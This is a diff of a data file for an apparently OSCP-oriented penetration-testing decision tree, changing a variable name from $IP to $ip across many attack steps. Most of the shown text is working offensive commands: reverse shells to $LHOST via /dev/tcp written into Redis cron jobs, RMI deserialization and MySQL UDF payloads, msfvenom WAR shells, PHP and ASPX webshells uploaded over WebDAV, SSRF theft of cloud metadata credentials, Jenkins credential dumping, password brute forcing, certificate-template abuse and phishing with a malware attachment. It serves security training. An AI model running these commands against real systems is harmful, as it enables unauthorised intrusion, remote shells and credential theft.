@@ -19,7 +19,7 @@ export LPORT=443
 export DOMAIN=domain.com
 
 mkdir -p ~/results/$ip/{scans,exploits,loot,screenshots,tunnels}
-cd ~/results/$IP`,
+cd ~/results/$ip`,
     warn: null,
     choices: [
       { label: "Single target IP — full port scan", next: "full_portscan" },
@@ -442,16 +442,16 @@ ping 172.16.50.1`,
     phase: "PIVOT",
     title: "SSH Tunnel",
     body: "SSH creds to the pivot means no binary uploads needed. Dynamic -D gives a full SOCKS5 proxy for proxychains.",
-    cmd: `ssh -D 1080 -N -f user@$IP
+    cmd: `ssh -D 1080 -N -f user@$ip
 # /etc/proxychains4.conf: socks5 127.0.0.1 1080
 proxychains nmap -sT -p 80,443,445 172.16.50.0/24
 
-ssh -L 8080:172.16.50.5:80 user@$IP -N
+ssh -L 8080:172.16.50.5:80 user@$ip -N
 curl http://localhost:8080
 
-ssh -R 4444:127.0.0.1:4444 user@$IP -N
+ssh -R 4444:127.0.0.1:4444 user@$ip -N
 
-ssh -J user@$IP user2@172.16.50.5`,
+ssh -J user@$ip user2@172.16.50.5`,
     warn: "proxychains + nmap: always -sT. Never -sS through SOCKS — it will hang.",
     choices: [
       { label: "SOCKS proxy up — discover internal hosts", next: "pivot_discovery" },
@@ -578,11 +578,11 @@ proxychains ssh -D 1081 user@172.16.50.X -N &`,
     phase: "RECON",
     title: "Unknown Service / Port",
     body: "nmap gave you a port you don't recognize. Banner grab first, then version-specific research. Every service has a fingerprint.",
-    cmd: `nc -nv $IP <PORT>
-curl -sv http://$IP:<PORT>
-curl -sv https://$IP:<PORT>
+    cmd: `nc -nv $ip <PORT>
+curl -sv http://$ip:<PORT>
+curl -sv https://$ip:<PORT>
 
-nmap -p <PORT> -sC -sV --version-intensity 9 $IP
+nmap -p <PORT> -sC -sV --version-intensity 9 $ip
 
 # Common high-port services:
 # 8080/8443/8009 — Tomcat, JBoss, GlassFish
@@ -596,7 +596,7 @@ nmap -p <PORT> -sC -sV --version-intensity 9 $IP
 # 2181          — ZooKeeper
 # 4848          — GlassFish admin
 
-searchsploit $(nmap -p <PORT> -sV $IP | grep open | awk '{print $3,$4}')`,
+searchsploit $(nmap -p <PORT> -sV $ip | grep open | awk '{print $3,$4}')`,
     warn: null,
     choices: [
       { label: "Tomcat / JBoss / Java app server", next: "tomcat" },
@@ -626,8 +626,8 @@ searchsploit $(nmap -p <PORT> -sV $IP | grep open | awk '{print $3,$4}')`,
     title: "Apache Tomcat",
     body: "Manager console upload is the classic path. Default creds are shockingly common. AJP connector (8009) enables Ghostcat if exposed.",
     cmd: `# Manager console
-http://$IP:8080/manager/html
-http://$IP:8080/host-manager/html
+http://$ip:8080/manager/html
+http://$ip:8080/host-manager/html
 
 # Default creds to try:
 # tomcat:tomcat   tomcat:s3cret   admin:admin
@@ -636,16 +636,16 @@ http://$IP:8080/host-manager/html
 # Brute force manager
 hydra -L /opt/SecLists/Usernames/tomcat-usernames.txt \\
   -P /opt/SecLists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt \\
-  http-get://$IP:8080/manager/html
+  http-get://$ip:8080/manager/html
 
 # Once in — deploy malicious WAR
 msfvenom -p java/jsp_shell_reverse_tcp \\
   LHOST=$LHOST LPORT=$LPORT -f war -o shell.war
 # Upload via Manager > Deploy > WAR file
-# Access: http://$IP:8080/shell/
+# Access: http://$ip:8080/shell/
 
 # Ghostcat CVE-2020-1938 (AJP port 8009)
-python3 ghostcat.py -p 8009 $IP`,
+python3 ghostcat.py -p 8009 $ip`,
     warn: null,
     choices: [
       { label: "WAR deployed — got shell", next: "shell_upgrade" },
@@ -658,25 +658,25 @@ python3 ghostcat.py -p 8009 $IP`,
     phase: "RECON",
     title: "Redis (6379)",
     body: "Unauthenticated Redis is often RCE. Write SSH keys, cron jobs, or webshells depending on what Redis can reach.",
-    cmd: `redis-cli -h $IP ping
-redis-cli -h $IP info
+    cmd: `redis-cli -h $ip ping
+redis-cli -h $ip info
 
 # If authenticated — try default passwords
-redis-cli -h $IP -a ""
-redis-cli -h $IP -a "redis"
-redis-cli -h $IP -a "password"
+redis-cli -h $ip -a ""
+redis-cli -h $ip -a "redis"
+redis-cli -h $ip -a "password"
 
 # RCE via authorized_keys
-redis-cli -h $IP config set dir /root/.ssh
-redis-cli -h $IP config set dbfilename authorized_keys
-redis-cli -h $IP set payload "\\n\\n$(cat ~/.ssh/id_rsa.pub)\\n\\n"
-redis-cli -h $IP save
+redis-cli -h $ip config set dir /root/.ssh
+redis-cli -h $ip config set dbfilename authorized_keys
+redis-cli -h $ip set payload "\\n\\n$(cat ~/.ssh/id_rsa.pub)\\n\\n"
+redis-cli -h $ip save
 
 # RCE via cron (if /var/spool/cron writable)
-redis-cli -h $IP config set dir /var/spool/cron
-redis-cli -h $IP config set dbfilename root
-redis-cli -h $IP set payload "\\n\\n* * * * * bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1\\n\\n"
-redis-cli -h $IP save`,
+redis-cli -h $ip config set dir /var/spool/cron
+redis-cli -h $ip config set dbfilename root
+redis-cli -h $ip set payload "\\n\\n* * * * * bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1\\n\\n"
+redis-cli -h $ip save`,
     warn: "Check what user Redis runs as before choosing your attack path.",
     choices: [
       { label: "SSH key write — got root shell", next: "got_root_linux" },
@@ -689,9 +689,9 @@ redis-cli -h $IP save`,
     phase: "RECON",
     title: "MSSQL (1433)",
     body: "MSSQL with xp_cmdshell enabled is instant RCE. SA account with default creds is common. impacket-mssqlclient handles everything.",
-    cmd: `impacket-mssqlclient sa:''@$IP
-impacket-mssqlclient sa:'sa'@$IP
-impacket-mssqlclient sa:'password'@$IP -windows-auth
+    cmd: `impacket-mssqlclient sa:''@$ip
+impacket-mssqlclient sa:'sa'@$ip
+impacket-mssqlclient sa:'password'@$ip -windows-auth
 
 # Once connected:
 SQL> enable_xp_cmdshell
@@ -717,20 +717,20 @@ SQL> SELECT * FROM tmp;`,
     phase: "RECON",
     title: "Java RMI (1099)",
     body: "Exposed Java RMI registry is often exploitable via deserialization. ysoserial generates payloads for common gadget chains.",
-    cmd: `nmap -p 1099 --script rmi-dumpregistry $IP
-nmap -p 1099 --script rmi-vuln-classloader $IP
+    cmd: `nmap -p 1099 --script rmi-dumpregistry $ip
+nmap -p 1099 --script rmi-vuln-classloader $ip
 
 # Enumerate RMI registry
-rmg enum $IP 1099
+rmg enum $ip 1099
 
 # ysoserial payload generation
 # Find the right gadget chain — try CommonsCollections first
 java -jar ysoserial.jar CommonsCollections6 'bash -c {bash,-i,>&,/dev/tcp/$LHOST/$LPORT,0>&1}' | \\
-  java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit $IP 1099 CommonsCollections6 \\
+  java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit $ip 1099 CommonsCollections6 \\
   'bash -c {bash,-i,>&,/dev/tcp/$LHOST/$LPORT,0>&1}'
 
 # remote-method-guesser (rmg) for modern exploitation
-rmg exploit $IP 1099 --payload 'bash -c bash$IFS-i>&/dev/tcp/$LHOST/$LPORT<&1'`,
+rmg exploit $ip 1099 --payload 'bash -c bash$IFS-i>&/dev/tcp/$LHOST/$LPORT<&1'`,
     warn: "Gadget chain depends on classpath — try CommonsCollections1-7, Spring, Groovy.",
     choices: [
       { label: "Got shell via deserialization", next: "shell_upgrade" },
@@ -744,22 +744,22 @@ rmg exploit $IP 1099 --payload 'bash -c bash$IFS-i>&/dev/tcp/$LHOST/$LPORT<&1'`,
     body: "Pivot through the web app to reach internal services. Time-based internal port scanning is reliable. Cloud metadata is a bonus prize.",
     cmd: `nc -nlvp 80
 
-curl "http://$IP/page?url=http://$LHOST/"
-curl "http://$IP/page?url=http://127.0.0.1/"
-curl "http://$IP/page?url=http://169.254.169.254/"
+curl "http://$ip/page?url=http://$LHOST/"
+curl "http://$ip/page?url=http://127.0.0.1/"
+curl "http://$ip/page?url=http://169.254.169.254/"
 
 # Internal port scan via timing
 for port in 22 80 443 445 3306 5432 6379 8080 8443; do
   echo -n "$port: "
-  time curl -so /dev/null "http://$IP/page?url=http://127.0.0.1:$port/"
+  time curl -so /dev/null "http://$ip/page?url=http://127.0.0.1:$port/"
 done
 
 # Cloud metadata
-curl "http://$IP/page?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+curl "http://$ip/page?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
 
 # File read
-curl "http://$IP/page?url=file:///etc/passwd"
-curl "http://$IP/page?url=gopher://127.0.0.1:25/"`,
+curl "http://$ip/page?url=file:///etc/passwd"
+curl "http://$ip/page?url=gopher://127.0.0.1:25/"`,
     warn: null,
     choices: [
       { label: "Reached internal service", next: "pivot_portscan" },
@@ -811,7 +811,7 @@ Get-DomainComputer | select name,operatingsystem
 Get-DomainGroupMember "Domain Admins"
 Find-LocalAdminAccess
 
-ldapsearch -x -h $IP -D "user@domain.com" -w 'pass' \\
+ldapsearch -x -h $ip -D "user@domain.com" -w 'pass' \\
   -b "dc=domain,dc=com" "(objectClass=user)" description
 
 Get-DomainUser | select samaccountname,description \\
@@ -1090,8 +1090,8 @@ ip route
 #   T1590 — Gather Network Information (DNS, subnet mapping)
 #   T1046 — Network Service Discovery
 
-## Recon Summary for $IP
-Host: $IP
+## Recon Summary for $ip
+Host: $ip
 OS Guess: [Linux/Windows + version]
 Open Ports: [list]
 
@@ -1108,7 +1108,7 @@ Open Ports: [list]
 ## Evidence
 - Screenshot: nmap full scan output
 - Screenshot: service version banner
-- File: ~/results/$IP/scans/full.txt`,
+- File: ~/results/$ip/scans/full.txt`,
     warn: "Version numbers matter — 'Apache on port 80' fails. 'Apache 2.4.49 on port 80, CVE-2021-41773 confirmed' passes.",
     choices: [
       { label: "TA0001 — Initial Access", next: "doc_initial_access" },
@@ -1127,7 +1127,7 @@ Open Ports: [list]
 #   T1566 — Phishing (client-side attacks)
 #   T1203 — Exploitation for Client Execution
 
-## Initial Access — $IP
+## Initial Access — $ip
 
 Vulnerability: [CVE / vuln name / misconfiguration]
 Service: [port + service]
@@ -1147,7 +1147,7 @@ Command used:
 ## Evidence
 - Screenshot: exploit execution + response
 - Screenshot: whoami + hostname + ip immediately after shell
-- File: ~/results/$IP/exploits/payload.txt (save your payload)`,
+- File: ~/results/$ip/exploits/payload.txt (save your payload)`,
     warn: "Save your exact payload to disk before moving on. You will need to reproduce this in the report and you will not remember the exact syntax 8 hours later.",
     choices: [
       { label: "TA0002 — Execution", next: "doc_execution" },
@@ -1169,7 +1169,7 @@ Command used:
 #   T1203 — Exploitation for Client Execution
 #   T1106 — Native API
 
-## Execution — $IP
+## Execution — $ip
 
 Interpreter/Method: [PowerShell / bash / cmd / web shell / etc.]
 Technique: T1059.00x
@@ -1186,7 +1186,7 @@ Delivery method: [uploaded via / triggered via / embedded in]
 ## Evidence
 - Screenshot: payload execution
 - Screenshot: callback received on attacker machine
-- File: ~/results/$IP/exploits/ (save payload file)`,
+- File: ~/results/$ip/exploits/ (save payload file)`,
     warn: "If you used msfvenom, save the exact generation command. 'msfvenom -p windows/x64/shell_reverse_tcp LHOST=x LPORT=443 -f exe > shell.exe' belongs in your notes verbatim.",
     choices: [
       { label: "TA0004 — Privilege Escalation", next: "doc_privesc" },
@@ -1208,7 +1208,7 @@ Delivery method: [uploaded via / triggered via / embedded in]
 #   T1134 — Access Token Manipulation
 #   T1068 — Exploitation for Privilege Escalation (kernel/CVE)
 
-## Privilege Escalation — $IP
+## Privilege Escalation — $ip
 
 Vector: [SUID / sudo / cron / service / token / CVE / etc.]
 Technique: T1548.001 / T1053.003 / etc. (pick closest)
@@ -1255,7 +1255,7 @@ whoami && id
 #   T1558.003 — Kerberoasting
 #   T1558.004 — AS-REP Roasting
 
-## Credential Access — $IP
+## Credential Access — $ip
 
 Method: [mimikatz / secretsdump / file search / kerberoast / etc.]
 Technique: T1003.001 / T1552.001 / T1558.003 (pick closest)
@@ -1274,7 +1274,7 @@ john --format=NT hashes.txt --wordlist=rockyou.txt
 ## Evidence
 - Screenshot: dump command + output
 - Screenshot: cracked hash result
-- File: ~/results/$IP/loot/hashes.txt`,
+- File: ~/results/$ip/loot/hashes.txt`,
     warn: "Never paste real credentials into a report without client approval — mask with [REDACTED] in deliverables. For the OSCP exam, show the full value.",
     choices: [
       { label: "TA0008 — Lateral Movement", next: "doc_lateral" },
@@ -1296,9 +1296,9 @@ john --format=NT hashes.txt --wordlist=rockyou.txt
 #   T1550.003 — Pass the Ticket
 #   T1563 — Remote Service Session Hijacking
 
-## Lateral Movement — $IP → $TARGET
+## Lateral Movement — $ip → $TARGET
 
-From: $IP ([username] @ [hostname])
+From: $ip ([username] @ [hostname])
 To: $TARGET ([username] @ [hostname])
 Method: [PtH / SSH / WinRM / RDP / SMB exec]
 Technique: T1021.002 / T1550.002 (pick closest)
@@ -1340,7 +1340,7 @@ Technique: T1021.002 / T1550.002 (pick closest)
 #   T1018 — Remote System Discovery
 #   T1135 — Network Share Discovery
 
-## Post-Shell Discovery — $IP
+## Post-Shell Discovery — $ip
 
 Shell as: [username + privilege level]
 
@@ -1384,7 +1384,7 @@ net user && net localgroup administrators  # Windows
 #   T1565 — Data Manipulation (you achieved impact)
 #   T1486 — Data Encrypted / T1496 — Resource Hijacking (conceptual)
 
-## Flag Capture — $IP
+## Flag Capture — $ip
 
 ### local.txt (low privilege)
 # Linux
@@ -1403,7 +1403,7 @@ whoami && hostname && ipconfig && type C:\Users\Administrator\Desktop\proof.txt
 ## Flag Log
 | Machine IP | User Flag (local.txt) | Root Flag (proof.txt) | Time |
 |------------|----------------------|----------------------|------|
-| $IP        | [hash value]         | [hash value]         | 00:00|
+| $ip        | [hash value]         | [hash value]         | 00:00|
 
 ## Evidence Requirements
 - ✅ local.txt: whoami + hostname + ip + flag — SINGLE screenshot
@@ -1563,16 +1563,16 @@ login handler at /src/auth/login.php line 42."
     phase: "WINDOWS",
     title: "RDP (3389)",
     body: "RDP is everywhere on Windows targets. xfreerdp from Kali, pass-the-hash via restricted admin mode, credential spray. Always try creds you already have.",
-    cmd: `xfreerdp /u:user /p:'password' /v:$IP /cert-ignore
-xfreerdp /u:administrator /pth:NTLM_HASH /v:$IP /cert-ignore +clipboard
+    cmd: `xfreerdp /u:user /p:'password' /v:$ip /cert-ignore
+xfreerdp /u:administrator /pth:NTLM_HASH /v:$ip /cert-ignore +clipboard
 
-crackmapexec rdp $IP -u users.txt -p passwords.txt
-crackmapexec rdp $IP -u administrator -H NTLM_HASH
+crackmapexec rdp $ip -u users.txt -p passwords.txt
+crackmapexec rdp $ip -u administrator -H NTLM_HASH
 
-nmap -p 3389 --script rdp-enum-encryption,rdp-vuln-ms12-020 $IP
+nmap -p 3389 --script rdp-enum-encryption,rdp-vuln-ms12-020 $ip
 
 # BlueKeep check (CVE-2019-0708) — DO NOT auto-exploit, can crash target
-nmap -p 3389 --script rdp-vuln-ms12-020 $IP`,
+nmap -p 3389 --script rdp-vuln-ms12-020 $ip`,
     warn: "Pass-the-hash via RDP requires restricted admin mode to be enabled on the target.",
     choices: [
       { label: "Got RDP access — Windows foothold", next: "windows_post_exploit" },
@@ -1610,23 +1610,23 @@ impacket-ntlmrelayx -tf targets.txt -smb2support -i  # interactive shell`,
     phase: "AD",
     title: "AD Certificate Services (ESC1/ESC4)",
     body: "Misconfigured certificate templates let low-priv users enroll as Domain Admin. ESC1 is the most common — find it with Certipy.",
-    cmd: `certipy find -u user@domain.com -p 'pass' -dc-ip $IP -vulnerable -stdout
+    cmd: `certipy find -u user@domain.com -p 'pass' -dc-ip $ip -vulnerable -stdout
 
 # ESC1 — enroll as DA using vulnerable template
 certipy req -u user@domain.com -p 'pass' \\
   -ca 'CA-NAME' -template 'VulnTemplate' \\
-  -upn administrator@domain.com -dc-ip $IP
+  -upn administrator@domain.com -dc-ip $ip
 
 # Authenticate with the certificate
-certipy auth -pfx administrator.pfx -dc-ip $IP
+certipy auth -pfx administrator.pfx -dc-ip $ip
 # Outputs NTLM hash for administrator
 
 # ESC4 — write owner on template, modify to ESC1, exploit
 certipy template -u user@domain.com -p 'pass' \\
-  -template 'VulnTemplate' -save-old -dc-ip $IP
+  -template 'VulnTemplate' -save-old -dc-ip $ip
 
 # Pass-the-hash with retrieved administrator hash
-evil-winrm -i $IP -u administrator -H <NTLM_HASH>`,
+evil-winrm -i $ip -u administrator -H <NTLM_HASH>`,
     warn: "Always -save-old when modifying templates in ESC4 — restore after exploitation or you'll break the environment.",
     choices: [
       { label: "Got DA cert — authenticated as admin", next: "dcsync" },
@@ -1654,7 +1654,7 @@ dir /s /b C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Credentials\\* 2>$null
 dir /s /b C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Protect\\* 2>$null
 
 # From Kali with domain backup key (DA required)
-impacket-dpapi backupkeys --export -t domain/admin:'pass'@$IP`,
+impacket-dpapi backupkeys --export -t domain/admin:'pass'@$ip`,
     warn: null,
     choices: [
       { label: "Found plaintext creds", next: "creds_found" },
@@ -1684,7 +1684,7 @@ gef➤  x/32wx $esp           # examine stack
 # !mona jmp -r esp          # find JMP ESP
 
 # -- FUZZ — find crash length -----------------
-python3 -c "print(\'A\' * 2000)" | nc $IP <PORT>
+python3 -c "print(\'A\' * 2000)" | nc $ip <PORT>
 # Increment by 100 until crash
 
 # -- FIND EXACT OFFSET ------------------------
@@ -1810,7 +1810,7 @@ msfvenom -p windows/x64/shell_reverse_tcp \\
    "/c " + Request["cmd"]) { RedirectStandardOutput=true,
    UseShellExecute=false }).StandardOutput.ReadToEnd()); %>
 
-# Access: http://$IP/shell.aspx?cmd=whoami
+# Access: http://$ip/shell.aspx?cmd=whoami
 
 # IIS specific paths
 C:\\inetpub\\wwwroot\\
@@ -1831,8 +1831,8 @@ type C:\\inetpub\\wwwroot\\web.config`,
     phase: "RECON",
     title: "PostgreSQL (5432)",
     body: "PostgreSQL with COPY TO/FROM PROGRAM is RCE. Default postgres user often has no password. pg_hba.conf controls who can connect.",
-    cmd: `psql -h $IP -U postgres
-psql -h $IP -U postgres -p 5432
+    cmd: `psql -h $ip -U postgres
+psql -h $ip -U postgres -p 5432
 
 # Default creds: postgres:(blank)  postgres:postgres  postgres:password
 
@@ -1864,11 +1864,11 @@ psql> SELECT current_user, pg_postmaster_start_time();`,
     phase: "RECON",
     title: "MongoDB (27017)",
     body: "Unauthenticated MongoDB exposes all databases. No auth by default in older versions. Dump everything — creds are often stored in plaintext.",
-    cmd: `mongosh $IP
-mongosh mongodb://$IP:27017
+    cmd: `mongosh $ip
+mongosh mongodb://$ip:27017
 
 # If auth required
-mongosh mongodb://admin:password@$IP:27017
+mongosh mongodb://admin:password@$ip:27017
 
 # Enumerate and dump
 > show dbs
@@ -1878,8 +1878,8 @@ mongosh mongodb://admin:password@$IP:27017
 > db.<collection>.find().pretty()
 
 # Dump all
-mongoexport --host $IP --db <db> --collection <col> --out dump.json
-mongodump --host $IP --out ./mongodump/
+mongoexport --host $ip --db <db> --collection <col> --out dump.json
+mongodump --host $ip --out ./mongodump/
 
 # Look for users, passwords, tokens, API keys
 > db.users.find()
@@ -1898,18 +1898,18 @@ mongodump --host $IP --out ./mongodump/
     phase: "WEB",
     title: "Jenkins (8080/8443)",
     body: "CI/CD server = code execution by design. Script console is RCE if you can reach it. Check anonymous access first — many dev instances skip auth entirely.",
-    cmd: `nmap -p 8080,8443 -sV $IP
-curl -s http://$IP:8080/api/json | jq .
-curl -s http://$IP:8080/script          # admin-only but worth trying
-curl -s http://$IP:8080/asynchPeople/   # user list (sometimes open)
+    cmd: `nmap -p 8080,8443 -sV $ip
+curl -s http://$ip:8080/api/json | jq .
+curl -s http://$ip:8080/script          # admin-only but worth trying
+curl -s http://$ip:8080/asynchPeople/   # user list (sometimes open)
 
 # Default creds: admin:admin  admin:jenkins  jenkins:jenkins
 # Brute force login
-hydra -l admin -P rockyou.txt $IP http-post-form \\
+hydra -l admin -P rockyou.txt $ip http-post-form \\
   "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^:F=loginError"
 
 # Script console RCE (Groovy) — once authenticated
-# http://$IP:8080/script
+# http://$ip:8080/script
 def cmd = "id"
 def proc = cmd.execute()
 proc.waitForOrKill(1000)
@@ -1928,7 +1928,7 @@ def creds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredenti
 creds.each { println it.id + ":" + it.username + ":" + it.password }
 
 # CVE-2024-23897 — arbitrary file read (Jenkins < 2.441)
-java -jar jenkins-cli.jar -s http://$IP:8080/ help "@/etc/passwd"`,
+java -jar jenkins-cli.jar -s http://$ip:8080/ help "@/etc/passwd"`,
     warn: "Script console RCE runs as the Jenkins service user — often jenkins or root. Check for SSH keys and AWS creds in credential store.",
     choices: [
       { label: "Anonymous script console — got RCE", next: "reverse_shell" },
@@ -1942,17 +1942,17 @@ java -jar jenkins-cli.jar -s http://$IP:8080/ help "@/etc/passwd"`,
     phase: "RECON",
     title: "VNC (5900-5906)",
     body: "VNC = graphical desktop access. No-auth instances are instant wins. Brute force is fast. Decrypt stored VNC passwords from config files if you find them.",
-    cmd: `nmap -p 5900-5906 -sV --script vnc-info,vnc-brute $IP
+    cmd: `nmap -p 5900-5906 -sV --script vnc-info,vnc-brute $ip
 
 # Check for no-auth (Security Type 1 = None)
-vncviewer $IP:5900   # try without password first
+vncviewer $ip:5900   # try without password first
 
 # Common VNC passwords
 # password  12345678  vnc123  admin  (blank)
 
 # Brute force
-hydra -P /usr/share/wordlists/rockyou.txt vnc://$IP
-medusa -h $IP -u "" -P passwords.txt -M vnc
+hydra -P /usr/share/wordlists/rockyou.txt vnc://$ip
+medusa -h $ip -u "" -P passwords.txt -M vnc
 
 # If you have file access — decrypt stored VNC password
 # Location: ~/.vnc/passwd  C:\\Users\\user\\.vnc\\passwd
@@ -1985,32 +1985,32 @@ print(decrypt(data,key))
     phase: "WEB",
     title: "WebDAV",
     body: "WebDAV over HTTP/HTTPS lets you upload files via PUT. If PUT is enabled and you can write to the webroot, you have a shell. Test methods first.",
-    cmd: `nmap -p 80,443 --script http-webdav-scan,http-methods $IP
-curl -X OPTIONS http://$IP/webdav/ -v   # Look for PUT in Allow header
+    cmd: `nmap -p 80,443 --script http-webdav-scan,http-methods $ip
+curl -X OPTIONS http://$ip/webdav/ -v   # Look for PUT in Allow header
 
-davtest -url http://$IP/webdav/
-davtest -url http://$IP/webdav/ -auth user:pass
+davtest -url http://$ip/webdav/
+davtest -url http://$ip/webdav/ -auth user:pass
 
 # Direct PUT upload
-curl -X PUT http://$IP/webdav/shell.php \\
+curl -X PUT http://$ip/webdav/shell.php \\
   -u user:pass \\
   -d '<?php system($_GET["cmd"]); ?>'
 
 # Upload as .txt then MOVE to .php (extension bypass)
-curl -X PUT http://$IP/webdav/shell.txt -u user:pass \\
+curl -X PUT http://$ip/webdav/shell.txt -u user:pass \\
   -d '<?php system($_GET["cmd"]); ?>'
-curl -X MOVE http://$IP/webdav/shell.txt \\
-  -u user:pass -H "Destination: http://$IP/webdav/shell.php"
+curl -X MOVE http://$ip/webdav/shell.txt \\
+  -u user:pass -H "Destination: http://$ip/webdav/shell.php"
 
 # ASPX for IIS
-curl -X PUT http://$IP/webdav/shell.aspx -u user:pass \\
+curl -X PUT http://$ip/webdav/shell.aspx -u user:pass \\
   --data-binary @shell.aspx
 
 # Common paths
 # /webdav/  /dav/  /WebDAV/  /uploads/  /_vti_bin/
 
 # List contents
-cadaver http://$IP/webdav/
+cadaver http://$ip/webdav/
 # dav> ls  put shell.php  get file.txt`,
     warn: "Check if the upload directory is web-accessible — WebDAV root may not be under webroot.",
     choices: [
@@ -2024,13 +2024,13 @@ cadaver http://$IP/webdav/
     phase: "RECON",
     title: "NFS (2049)",
     body: "NFS shares expose the filesystem. no_root_squash = instant root. Mount the share, check UIDs, look for SSH keys and credentials.",
-    cmd: `nmap -p 2049,111 --script nfs-ls,nfs-showmount,nfs-statfs $IP
-showmount -e $IP
-rpcinfo -p $IP | grep nfs
+    cmd: `nmap -p 2049,111 --script nfs-ls,nfs-showmount,nfs-statfs $ip
+showmount -e $ip
+rpcinfo -p $ip | grep nfs
 
 # Mount the share
 mkdir /mnt/nfs
-mount -t nfs $IP:/share /mnt/nfs -o nolock
+mount -t nfs $ip:/share /mnt/nfs -o nolock
 ls -la /mnt/nfs
 
 # Find interesting files
@@ -2053,7 +2053,7 @@ useradd -u 1000 fakeuser && su fakeuser
 mkdir -p /mnt/nfs/root/.ssh
 cp ~/.ssh/id_rsa.pub /mnt/nfs/root/.ssh/authorized_keys
 chmod 600 /mnt/nfs/root/.ssh/authorized_keys
-ssh root@$IP`,
+ssh root@$ip`,
     warn: "Always check if no_root_squash is set — showmount output shows (everyone) vs (ro,root_squash).",
     choices: [
       { label: "no_root_squash — SUID bash = root", next: "got_root_linux" },
@@ -2067,9 +2067,9 @@ ssh root@$IP`,
     phase: "RECON",
     title: "MySQL (3306)",
     body: "MySQL with FILE privilege = read/write OS files. INTO OUTFILE drops a webshell. UDF gives full RCE. Root with no password is common on dev boxes.",
-    cmd: `nmap -p 3306 -sV --script mysql-info,mysql-empty-password $IP
-mysql -u root -h $IP           # no password
-mysql -u root -h $IP -p        # try: root, password, mysql, toor
+    cmd: `nmap -p 3306 -sV --script mysql-info,mysql-empty-password $ip
+mysql -u root -h $ip           # no password
+mysql -u root -h $ip -p        # try: root, password, mysql, toor
 
 # Default creds: root:(blank)  root:root  root:password
 
@@ -2094,7 +2094,7 @@ CREATE FUNCTION do_system RETURNS integer SONAME 'raptor_udf2.so';
 SELECT do_system('bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1');
 
 # Brute force
-hydra -l root -P rockyou.txt $IP mysql`,
+hydra -l root -P rockyou.txt $ip mysql`,
     warn: "secure_file_priv restricts INTO OUTFILE. If set to a specific path, you can only write there.",
     choices: [
       { label: "INTO OUTFILE webshell — got RCE", next: "reverse_shell" },
@@ -2108,28 +2108,28 @@ hydra -l root -P rockyou.txt $IP mysql`,
     phase: "RECON",
     title: "Rsync (873)",
     body: "Rsync modules are directory shares. Anonymous read = file loot. Anonymous write = upload SSH keys or webshells. Enumerate modules first.",
-    cmd: `nmap -p 873 -sV --script rsync-list-modules $IP
-nc -nv $IP 873     # banner grab
+    cmd: `nmap -p 873 -sV --script rsync-list-modules $ip
+nc -nv $ip 873     # banner grab
 
 # List modules (anonymous)
-rsync rsync://$IP/
-rsync rsync://$IP/<module>/
+rsync rsync://$ip/
+rsync rsync://$ip/<module>/
 
 # Download entire module
-rsync -av rsync://$IP/<module>/ /tmp/rsync_loot/
+rsync -av rsync://$ip/<module>/ /tmp/rsync_loot/
 
 # With credentials
-rsync -av rsync://user:pass@$IP/<module>/ /tmp/loot/
+rsync -av rsync://user:pass@$ip/<module>/ /tmp/loot/
 
 # Search for useful files
 find /tmp/rsync_loot -name "id_rsa" -o -name "*.key" -o -name ".env"
 find /tmp/rsync_loot -name "*.conf" | xargs grep -i "pass\\|secret"
 
 # Upload SSH key (if writable)
-rsync ~/.ssh/id_rsa.pub rsync://$IP/<module>/.ssh/authorized_keys
+rsync ~/.ssh/id_rsa.pub rsync://$ip/<module>/.ssh/authorized_keys
 
 # Upload webshell (if module under webroot)
-rsync shell.php rsync://$IP/<module>/shell.php`,
+rsync shell.php rsync://$ip/<module>/shell.php`,
     warn: "Module names are case-sensitive. Try common names: backup, data, files, web, www, home, root.",
     choices: [
       { label: "Anonymous read — found credentials", next: "creds_found" },
@@ -2143,14 +2143,14 @@ rsync shell.php rsync://$IP/<module>/shell.php`,
     phase: "RECON",
     title: "SMTP (25/465/587)",
     body: "SMTP leaks usernames via VRFY/EXPN/RCPT. Valid users feed your spray lists. Open relay lets you send phishing emails internally.",
-    cmd: `nmap -p 25,465,587 --script smtp-commands,smtp-enum-users,smtp-ntlm-info $IP
+    cmd: `nmap -p 25,465,587 --script smtp-commands,smtp-enum-users,smtp-ntlm-info $ip
 
 # Banner grab
-nc $IP 25
-telnet $IP 25
+nc $ip 25
+telnet $ip 25
 
 # VRFY — user enumeration (most common)
-telnet $IP 25
+telnet $ip 25
 EHLO test
 VRFY root
 VRFY admin
@@ -2165,18 +2165,18 @@ MAIL FROM:<test@test.com>
 RCPT TO:<admin@$DOMAIN>   # 250=exists  550=not found
 
 # Automated user enum
-smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t $IP
-smtp-user-enum -M RCPT -U users.txt -t $IP -f sender@test.com
+smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t $ip
+smtp-user-enum -M RCPT -U users.txt -t $ip -f sender@test.com
 
 # Open relay test
-telnet $IP 25
+telnet $ip 25
 EHLO test
 MAIL FROM:<attacker@evil.com>
 RCPT TO:<victim@external.com>   # 250 = open relay
 
 # Send phishing if open relay (client-side attacks)
 swaks --to victim@$DOMAIN --from "it@$DOMAIN" \\
-  --server $IP --attach malware.hta`,
+  --server $ip --attach malware.hta`,
     warn: "VRFY and EXPN are often disabled on hardened servers. RCPT TO is less likely to be blocked.",
     choices: [
       { label: "Enumerated valid users — spray them", next: "ad_spray" },
@@ -2189,33 +2189,33 @@ swaks --to victim@$DOMAIN --from "it@$DOMAIN" \\
     phase: "RECON",
     title: "Elasticsearch (9200/9300)",
     body: "Elasticsearch REST API is unauthenticated by default in older versions. All data is JSON and browsable. Dump everything — it often holds app credentials and PII.",
-    cmd: `nmap -p 9200,9300 -sV $IP
-curl -s http://$IP:9200/          # cluster info + version
-curl -s http://$IP:9200/_cat/indices?v  # list all indices
-curl -s http://$IP:9200/_cat/nodes?v    # node info
+    cmd: `nmap -p 9200,9300 -sV $ip
+curl -s http://$ip:9200/          # cluster info + version
